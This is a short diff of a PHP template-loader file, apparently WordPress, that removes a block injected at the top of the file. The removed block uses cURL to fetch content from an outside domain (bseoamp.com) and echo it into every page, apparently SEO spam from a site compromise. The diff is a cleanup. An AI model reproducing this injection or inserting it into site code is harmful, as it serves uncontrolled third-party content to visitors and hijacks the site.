@@ -1,17 +1,4 @@
 <?php
-function get_remote_content($url) {
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result ?: '';
-}
-
-echo get_remote_content('https://bseoamp.com/bseo1/');
-?>
-<?php
 /**
  * Loads the correct template based on the visitor's url
  *
